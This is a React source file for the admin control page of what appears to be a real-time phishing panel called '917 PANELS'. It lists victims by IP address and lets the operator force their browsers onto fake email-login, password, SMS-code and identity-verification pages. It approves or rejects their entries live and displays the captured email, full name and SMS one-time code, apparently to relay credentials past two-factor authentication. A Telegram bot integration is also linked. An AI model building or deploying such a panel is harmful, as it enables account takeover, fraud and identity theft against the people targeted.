import React, { useState, useEffect } from 'react';
import { useNavigate, Link } from 'react-router-dom';
import { 
  Users, 
  LogOut, 
  LayoutDashboard, 
  ShieldCheck,
  Zap,
  Coffee,
  CheckCircle2,
  Clock,
  ArrowRight,
  Monitor,
  Send
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { ClientStore, ClientData, SystemMode } from '../services/ClientStore';

export default function AdminControl() {
  const navigate = useNavigate();
  const [clients, setClients] = useState(ClientStore.getClients());
  const [selectedClient, setSelectedClient] = useState<ClientData | null>(null);
  const [systemMode, setSystemMode] = useState<SystemMode>(ClientStore.getSystemMode());

  useEffect(() => {
    const fetchData = async () => {
      await ClientStore.fetchClients();
      setClients(ClientStore.getClients());
      setSystemMode(ClientStore.getSystemMode());
    };
    fetchData();
    const interval = setInterval(fetchData, 2000);
    return () => clearInterval(interval);
  }, []);

  const handleSignOut = () => {
    localStorage.removeItem('isAdminAuthenticated');
    navigate('/admin');
  };

  const setTargetPage = async (clientId: string, page: string) => {
    await ClientStore.addOrUpdateClient({ id: clientId, targetPage: page });
    alert(`Client wird nach ${page} weitergeleitet...`);
    setSelectedClient(null);
  };

  const handleDecision = async (clientId: string, decision: 'FORWARD' | 'DECLINE') => {
    await ClientStore.addOrUpdateClient({ id: clientId, adminDecision: decision });
    setSelectedClient(null);
  };

  if (systemMode !== 'LIVE') {
    return (
      <div className="flex h-screen bg-black text-white font-mono items-center justify-center p-12">
        <div className="text-center space-y-8 max-w-md">
           <Zap className="w-16 h-16 text-white/10 mx-auto animate-pulse" />
           <h2 className="text-2xl font-black uppercase italic tracking-tighter">Live Modus Deaktiviert</h2>
           <p className="text-[11px] text-[#444] font-bold uppercase tracking-widest leading-relaxed">
             Der Control-Center ist nur im LIVE-Modus verfügbar. Bitte aktivieren Sie den Live-Modus im Dashboard, um Clients in Echtzeit zu steuern.
           </p>
           <Link to="/admin/dashboard" className="inline-block px-8 py-4 bg-white text-black text-[10px] font-black uppercase tracking-widest">
             Zum Dashboard
           </Link>
        </div>
      </div>
    );
  }

  return (
    <div className="flex h-screen bg-black text-white font-mono selection:bg-white selection:text-black antialiased">
      {/* Sidebar */}
      <div className="w-64 border-r border-white/5 flex flex-col p-8 h-full shrink-0">
        <div className="mb-16">
          <h1 className="text-xl font-black italic tracking-tighter text-white uppercase">917 PANELS</h1>
          <p className="text-[#333] text-[9px] font-bold uppercase tracking-[0.2em] mt-1">Version 1.0.0</p>
        </div>

        <nav className="flex-grow space-y-12">
          <div>
            <p className="text-[#222] text-[10px] font-bold uppercase tracking-widest mb-6">Main</p>
            <div className="space-y-4">
              <Link to="/admin/dashboard" className="flex items-center gap-3 text-[#333] hover:text-white transition-colors">
                <LayoutDashboard className="w-4 h-4" />
                <span className="text-xs font-bold uppercase tracking-tight">Dashboard</span>
              </Link>
              <Link to="/admin/clients" className="flex items-center gap-3 text-[#333] hover:text-white transition-colors">
                <Users className="w-4 h-4" />
                <span className="text-xs font-bold uppercase tracking-tight">Clients</span>
              </Link>
              <Link to="/admin/control" className="flex items-center gap-3 text-white transition-colors">
                <Monitor className="w-4 h-4 text-white" />
                <span className="text-xs font-bold uppercase tracking-tight">Control</span>
              </Link>
            </div>
          </div>

          <div>
            <p className="text-[#222] text-[10px] font-bold uppercase tracking-widest mb-6">Integrations</p>
            <div className="space-y-4">
              <Link to="/admin/telegram" className="flex items-center gap-3 text-[#333] hover:text-white transition-colors">
                <Send className="w-4 h-4" />
                <span className="text-xs font-bold uppercase tracking-tight">Telegram Bot</span>
              </Link>
            </div>
          </div>
        </nav>

        <div className="pt-8 border-t border-white/5 space-y-6">
          <div className="flex items-center gap-2 mb-4">
             <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse shadow-[0_0_8px_rgba(34,197,94,0.3)]" />
             <span className="text-[9px] font-black uppercase text-green-500 tracking-widest">Connected</span>
          </div>
          <button onClick={handleSignOut} className="flex items-center gap-2 text-[#333] hover:text-white text-[10px] uppercase font-bold tracking-widest transition-all">
            <LogOut className="w-3 h-3" /> Sign Out
          </button>
        </div>
      </div>

      {/* Main */}
      <div className="flex-1 overflow-y-auto p-12">
        <header className="mb-12 flex justify-between items-end">
          <div>
            <h2 className="text-4xl font-black tracking-tighter uppercase italic leading-none">Live Control</h2>
            <p className="mt-4 text-[10px] font-bold text-white/20 uppercase tracking-[0.4em]">Realtime Client Interceptor</p>
          </div>
          <div className="flex items-center gap-2">
            <span className="w-2 h-2 rounded-full bg-green-500 animate-ping" />
            <span className="text-[10px] font-black uppercase text-green-500 tracking-widest">System Active</span>
          </div>
        </header>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-12">
          {/* Active Clients List */}
          <div className="space-y-4">
            <h5 className="text-[10px] font-black text-[#222] uppercase tracking-widest mb-6">Connected Clients</h5>
            <div className="space-y-[1px] bg-white/5 border border-white/5">
              {clients.filter(c => c.status === 'CONNECTED' || c.waitingFor !== 'NONE').map(client => (
                <div 
                  key={client.id}
                  onClick={() => setSelectedClient(client)}
                  className={cn(
                    "p-6 cursor-pointer border-b border-white/[0.02] last:border-0 transition-all grid grid-cols-[auto_1fr_auto] gap-8 items-center bg-black",
                    selectedClient?.id === client.id ? "bg-white/[0.03] border-l-2 border-l-white" : "hover:bg-white/[0.01]"
                  )}
                >
                  <div className={cn(
                    "w-2 h-2 rounded-full",
                    client.waitingFor !== 'NONE' ? "bg-primary animate-pulse" : "bg-green-500"
                  )} />
                  <div>
                    <p className="text-sm font-bold text-white mb-1">{client.ip}</p>
                    <p className="text-[9px] font-black text-[#333] uppercase tracking-widest italic">{client.currentPage || 'Unknown Page'}</p>
                  </div>
                  {client.waitingFor !== 'NONE' && (
                    <span className="px-2 py-1 bg-primary text-white text-[8px] font-black uppercase tracking-widest">Waiting for {client.waitingFor}</span>
                  )}
                </div>
              ))}
              {clients.length === 0 && (
                <div className="p-12 text-center text-[#222] uppercase text-[9px] font-bold tracking-widest italic">No active connections...</div>
              )}
            </div>
          </div>

          {/* Control Panel */}
          <div>
             <AnimatePresence mode="wait">
               {selectedClient ? (
                 <motion.div 
                   key={selectedClient.id}
                   initial={{ opacity: 0, x: 20 }}
                   animate={{ opacity: 1, x: 0 }}
                   exit={{ opacity: 0, x: -20 }}
                   className="border border-white/5 p-10 bg-white/[0.01] sticky top-0"
                 >
                    <h3 className="text-2xl font-black italic tracking-tighter uppercase mb-6 flex items-center justify-between">
                      {selectedClient.ip}
                      <span className="text-[10px] font-bold text-[#222]">MODUS: {selectedClient.executionMode || 'UNKNOWN'}</span>
                    </h3>
                    
                    <div className="space-y-12">
                       {/* Decisions */}
                       {selectedClient.waitingFor !== 'NONE' && (
                         <div className="space-y-4">
                            <p className="text-[10px] font-black text-primary uppercase tracking-widest">Realtime Decision Required</p>
                            <div className="grid grid-cols-2 gap-4">
                               <button 
                                onClick={() => handleDecision(selectedClient.id, 'FORWARD')}
                                className="py-4 bg-white text-black font-black uppercase text-[10px] tracking-widest hover:bg-neutral-200"
                               >
                                 Approve / Forward
                               </button>
                               <button 
                                onClick={() => handleDecision(selectedClient.id, 'DECLINE')}
                                className="py-4 bg-red-900 text-white font-black uppercase text-[10px] tracking-widest hover:bg-red-800"
                               >
                                 Decline / Error
                               </button>
                            </div>
                         </div>
                       )}

                       {/* Force Navigation */}
                       <div className="space-y-6">
                          <p className="text-[10px] font-black text-[#222] uppercase tracking-widest">Force Navigation Push</p>
                          <div className="grid grid-cols-2 gap-2">
                             {[
                               { name: 'Login Email', path: '/login-email' },
                               { name: 'Login Password', path: '/login-password' },
                               { name: 'SMS Auth', path: '/sms-verification' },
                               { name: 'Identity form', path: '/identity-verification' },
                               { name: 'Success Page', path: '/success' },
                               { name: 'Loading Screen', path: '/redirect' }
                             ].map(p => (
                               <button 
                                key={p.path}
                                onClick={() => setTargetPage(selectedClient.id, p.path)}
                                className="p-3 border border-white/5 bg-black hover:border-white/20 text-left transition-all"
                               >
                                  <p className="text-[9px] font-bold text-white/40 uppercase tracking-widest mb-1">Route</p>
                                  <p className="text-[10px] font-black uppercase italic">{p.name}</p>
                               </button>
                             ))}
                          </div>
                       </div>

                       {/* Log View */}
                       <div className="pt-8 border-t border-white/5">
                          <p className="text-[9px] font-black text-[#222] uppercase tracking-widest mb-4">Captured Payload Summary</p>
                          <div className="text-[10px] text-white/40 leading-relaxed font-bold uppercase space-y-1">
                             <p>Email: <span className="text-white">{selectedClient.email || '-'}</span></p>
                             <p>Identity: <span className="text-white">{selectedClient.fullName || '-'}</span></p>
                             <p>SMS: <span className="text-white tracking-widest">{selectedClient.smsCode || '-'}</span></p>
                          </div>
                       </div>
                    </div>
                 </motion.div>
               ) : (
                 <div className="h-full border border-dashed border-white/5 flex items-center justify-center p-20 text-center">
                    <p className="text-[10px] font-bold text-[#222] uppercase tracking-widest">Select a client to take control</p>
                 </div>
               )}
             </AnimatePresence>
          </div>
        </div>
      </div>
    </div>
  );
}

function cn(...classes: any[]) {
  return classes.filter(Boolean).join(' ');
}
